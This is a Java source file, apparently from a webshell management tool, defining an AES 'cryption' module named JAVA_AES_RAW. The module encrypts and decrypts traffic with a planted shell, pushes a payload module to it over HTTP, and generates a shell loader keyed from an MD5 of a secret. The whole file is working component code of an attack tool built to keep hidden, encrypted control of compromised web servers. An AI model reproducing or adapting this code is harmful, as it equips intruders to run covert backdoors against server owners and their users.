package shells.cryptions.JavaAes;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(
   Name = "JAVA_AES_RAW",
   payloadName = "JavaDynamicPayload"
)
public class JavaAesRaw implements Cryption {
   private ShellEntity shell;
   private Http http;
   private Cipher decodeCipher;
   private Cipher encodeCipher;
   private String key;
   private boolean state;
   private byte[] payload;

   public void init(ShellEntity context) {
      this.shell = context;
      this.http = this.shell.getHttp();
      this.key = this.shell.getSecretKeyX();

      try {
         this.encodeCipher = Cipher.getInstance("AES");
         this.decodeCipher = Cipher.getInstance("AES");
         this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
         this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
         this.payload = this.shell.getPayloadModule().getPayload();
         this.shell.getHeaders().put("Content-Type", "application/octet-stream");
         if (this.payload != null) {
            this.http.sendHttpResponse(this.payload);
            this.state = true;
         } else {
            Log.error("payload Is Null");
         }

      } catch (Exception var3) {
         Log.error((Throwable)var3);
      }
   }

   public byte[] encode(byte[] data) {
      try {
         return this.encodeCipher.doFinal(data);
      } catch (Exception var3) {
         Log.error((Throwable)var3);
         return null;
      }
   }

   public byte[] decode(byte[] data) {
      try {
         return this.decodeCipher.doFinal(data);
      } catch (Exception var3) {
         Log.error((Throwable)var3);
         return null;
      }
   }

   public boolean isSendRLData() {
      return false;
   }

   public boolean check() {
      return this.state;
   }

   public byte[] generate(String password, String secretKey) {
      return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
   }
}
